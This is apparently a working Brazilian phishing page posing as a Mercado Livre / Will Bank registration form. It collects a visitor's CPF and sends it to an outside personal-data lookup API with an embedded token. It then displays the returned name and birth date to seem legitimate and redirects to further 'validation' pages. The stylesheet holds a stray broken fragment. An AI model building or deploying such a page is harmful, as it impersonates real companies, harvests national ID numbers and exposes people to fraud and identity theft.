    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <title> - Cadastro</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #F5F5F5;
            min-height: 100vh;
            color: #000000;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated Background Elements */
        .bg-decoration {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.03;
            pointer-events: none;
        }

        .decoration {
            position: absolute;
            border-radius: 50%;
            background: #ffe600;
        }

        .decoration1 {
            width: 300px;
            height: 300px;
            top: 10%;
            right: 5%;
            animation: float1 20s infinite ease-in-out;
        }

        .decoration2 {
            width: 200px;
            height: 200px;
            bottom: 10%;
            left: 5%;
            animation: float2 25s infinite ease-in-out;
        }

        .decoration3 {
            width: 150px;
            height: 150px;
            top: 50%;
            left: 50%;
            animation: float3 30s infinite ease-in-out;
        }

        @keyframes float1 {

            0%,
            100% {
                transform: translate(0, 0) scale(1);
            }

            50% {
                transform: translate(-30px, 30px) scale(1.1);
            }
        }

        @keyframes float2 {

            0%,
            100% {
                transform: translate(0, 0) scale(1);
            }

            50% {
                transform: translate(30px, -30px) scale(0.9);
            }
        }

        @keyframes float3 {

            0%,
            100% {
                transform: translate(-50%, -50%) rotate(0deg);
            }

            50% {
                transform: translate(-50%, -50%) rotate(180deg);
            }
        }

        /* Header */
        .header {
            background: #ffe600;
            padding: 20px;
            box-shadow: 0 5px 20px rgba(255, 217, 0, 0.2);
            animation: slideDown 0.6s ease-out;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: #ffe600;
            opacity: 0.8;
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% {
                opacity: 0.8;
            }

            50% {
                opacity: 0.5;
            }

            100% {
                opacity: 0.8;
            }
        }

        @keyframes slideDown {
            from {
                transform: translateY(-100%);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .logo-img {
            height: 65px;
            width: auto;
            animation: logoAppear 0.8s ease-out;
        }

        shadow(0 2px 8px rgba(0, 0, 0, 0.1));
        }

        @keyframes logoAppear {
            from {
                transform: scale(0.8);
                opacity: 0;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Content Container */
        .content-container {
            max-width: 520px;
            margin: 30px auto;
            padding: 40px 30px;
            background: white;
            border-radius: 25px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            animation: scaleIn 0.6s ease-out;
            position: relative;
            border: 1px solid #F5F5F5;
        }

        @keyframes scaleIn {
            from {
                transform: scale(0.9);
                opacity: 0;
            }

            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        /* Title Section */
        .title-section {
            margin-bottom: 40px;
        }

        .main-title {
            font-size: 24px;
            font-weight: 600;
            color: #000000;
            line-height: 1.3;
            margin-bottom: 30px;
            animation: fadeInUp 0.6s ease-out;
        }

        @keyframes fadeInUp {
            from {
                transform: translateY(20px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        /* Form */
        .form-section {
            margin-bottom: 40px;
            animation: fadeIn 0.8s ease-out 0.3s both;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            color: #7F8C8D;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #E8E9EA;
            border-radius: 12px;
            font-size: 16px;
            font-family: 'Inter', sans-serif;
            color: #000000;
            background: white;
            transition: all 0.3s ease;
            outline: none;
        }

        .form-input:focus {
            border-color: #ffe600;
            box-shadow: 0 0 0 3px rgba(255, 217, 0, 0.1);
        }

        .form-input::placeholder {
            color: #BDC3C7;
            font-weight: 400;
        }

        /* Button */
        .button {
            background: #ffe600;
            color: #000000;
            padding: 20px 45px;
            border-radius: 50px;
            text-decoration: none;
            display: block;
            font-weight: 700;
            font-size: 18px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 217, 0, 0.25);
            position: relative;
            overflow: hidden;
            text-align: center;
            border: none;
            cursor: pointer;
            width: 100%;
            font-family: 'Inter', sans-serif;
            animation: fadeIn 0.8s ease-out 0.5s both;
        }

        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 217, 0, 0.4);
        }

        .button:active {
            transform: translateY(0);
        }

        .button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* Loading Animation */
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #28a745;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Success Icon */
        .success-icon {
            width: 60px;
            height: 60px;
            background: #28a745;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            animation: successPop 0.6s ease-out;
        }

        .success-icon::after {
            content: '✓';
            color: white;
            font-size: 30px;
            font-weight: bold;
        }

        @keyframes successPop {
            0% {
                transform: scale(0);
            }

            50% {
                transform: scale(1.1);
            }

            100% {
                transform: scale(1);
            }
        }

        /* Success Message */
        .success-message {
            color: #28a745;
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 30px;
        }

        /* User Data */
        .user-data {
            margin-bottom: 30px;
        }

        .user-data-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid #E8E9EA;
        }

        .user-data-item:last-child {
            border-bottom: none;
        }

        .user-data-label {
            font-weight: 600;
            color: #000000;
        }

        .user-data-value {
            color: #7F8C8D;
            font-weight: 500;
        }

        /* Hidden states */
        .hidden {
            display: none;
        }

        /* Footer */
        footer {
            padding: 30px 20px;
            text-align: center;
            background: #FAFAFA;
            border-top: 1px solid #E8E8E8;
            margin-top: 50px;
        }

        footer p {
            color: #7F8C8D;
            font-size: 12px;
            margin: 3px 0;
            line-height: 1.5;
        }

        .footer-company {
            font-weight: 700;
            color: #000000;
            font-size: 14px;
            margin-bottom: 8px;
        }

        /* Mobile Responsive */
        @media (max-width: 500px) {
            .content-container {
                margin: 20px 15px;
                padding: 30px 20px;
            }

            .main-title {
                font-size: 22px;
            }

            .logo-img {
                height: 65px;
            }

            .button {
                padding: 16px 35px;
                font-size: 16px;
            }

            .form-input {
                padding: 14px 16px;
                font-size: 16px;
            }
        }
    </style>
</head>

<body>
    <div class="bg-decoration">
        <div class="decoration decoration1"></div>
        <div class="decoration decoration2"></div>
        <div class="decoration decoration3"></div>
    </div>
    <div class="header">
        <img src="images/logomerc.png" alt="Will Bank" class="logo-img">
    </div>
    <div class="content-container">
        <!-- Tela inicial do formulário -->
        <div id="form-screen">
            <div class="title-section">
                <h1 class="main-title">Preencha seus dados para cadastro</h1>
            </div>
            <div class="form-section">
                <div class="form-group">
                    <label class="form-label" for="cpf">CPF</label>
                    <input type="text" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14">
                </div>
            </div>
            <button class="button" id="continuar-btn">Continuar</button>
        </div>

        <!-- Tela de carregamento -->
        <div id="loading-screen" class="hidden">
            <div class="title-section">
                <div class="loading-spinner"></div>
                <h1 class="main-title" style="text-align: center;">Estamos procurando seus dados</h1>
            </div>
        </div>

        <!-- Tela de sucesso -->
        <div id="success-screen" class="hidden">
            <div class="title-section" style="text-align: center;">
                <div class="success-icon"></div>
                <div class="success-message">Dados encontrados com sucesso!</div>
            </div>
            <div class="user-data">
                <div class="user-data-item">
                    <span class="user-data-label">Nome:</span>
                    <span class="user-data-value" id="user-name">-</span>
                </div>
                <div class="user-data-item">
                    <span class="user-data-label">Data de Nascimento:</span>
                    <span class="user-data-value" id="user-birth">-</span>
                </div>
            </div>
            <button class="button" id="continuar-final">Continuar</button>
        </div>
    </div>

    <footer>
        <p class="footer-company">Mercado Livre</p>
        <p>CNPJ: 23.862.762/0001-00</p>
        <p>Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP</p>
        <p>© 2025 - Todos os direitos reservados</p>
    </footer>

    <script>
    // Função para obter todos os parâmetros da URL atual (incluindo UTMs)
    function getUrlParams() {
        const params = {};
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);

        for (const [key, value] of urlParams) {
            params[key] = value;
        }
        return params;
    }

    // Função para construir URL preservando parâmetros UTM
    function buildUrlWithParams(baseUrl) {
        const params = getUrlParams();
        const url = new URL(baseUrl, window.location.href);

        Object.keys(params).forEach(key => {
            url.searchParams.append(key, params[key]);
        });

        return url.toString();
    }

    document.getElementById('cpf').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length <= 11) {
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        }
    });

    async function consultarCPF(cpf) {
        const cpfLimpo = cpf.replace(/[^\d]/g, '');

        if (cpfLimpo.length !== 11) {
            throw new Error('CPF inválido: deve conter 11 dígitos');
        }

        const apiUrl = `https://searchapi.dnnl.live/consulta?token_api=5717&cpf=${cpfLimpo}`;

        const response = await fetch(apiUrl, { method: 'GET' });
        const data = await response.json();

        if (!data.dados || !data.dados.length) {
            throw new Error('CPF não encontrado');
        }

        return {
            nome: data.dados[0].NOME || 'Nome não disponível',
            data_nascimento: data.dados[0].NASC || 'Data não disponível'
        };
    }

    document.getElementById('continuar-btn').addEventListener('click', async function () {
        const cpf = document.getElementById('cpf').value;

        if (cpf.length < 14) {
            alert('Por favor, preencha um CPF válido.');
            return;
        }

        document.getElementById('form-screen').classList.add('hidden');
        document.getElementById('loading-screen').classList.remove('hidden');

        try {
            const userData = await consultarCPF(cpf);

            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('success-screen').classList.remove('hidden');

            document.getElementById('user-name').textContent = userData.nome;
            document.getElementById('user-birth').textContent = userData.data_nascimento;

        } catch (error) {
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('form-screen').classList.remove('hidden');
            alert(`Erro: ${error.message}`);
        }
    });

    document.getElementById('continuar-final').addEventListener('click', function () {
        window.location.href = buildUrlWithParams('/home.html/validacao.html/2.html/');
    });
</script>



</body></html>
